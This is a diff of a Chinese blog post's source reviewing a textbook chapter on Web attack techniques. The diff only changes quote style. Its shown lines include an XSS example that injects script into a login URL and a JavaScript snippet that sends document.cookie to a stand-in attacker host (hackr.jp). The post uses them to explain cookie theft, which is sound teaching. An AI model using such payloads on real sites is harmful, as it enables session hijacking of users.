@@ -1,10 +1,10 @@
 ---
-title: "深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术"
-date: "2018-09-18 11:50:54"
-slug: "Learn-HTTP-P11"
-tags: "http"
+title: '深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术'
+date: '2018-09-18 11:50:54'
+slug: 'Learn-HTTP-P11'
+tags: 'http'
 categories:
-  - "http"
+  - 'http'
 ---
 
 不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs 以及 js 数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的 javaScript》系列三本等待开封...
@@ -128,9 +128,9 @@ http: //example.jp/login?ID=><script>var f=document.getElementById(login); f.act
 
 ```javascript
 var content = escape(document.cookie);
-document.write("<img src=http://hackr.jp/?");
+document.write('<img src=http://hackr.jp/?');
 document.write(content);
-document.write(">");
+document.write('>');
 ```
 
 在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然 后这些信息会发送至攻击者的 Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的 Cookie 信息了。
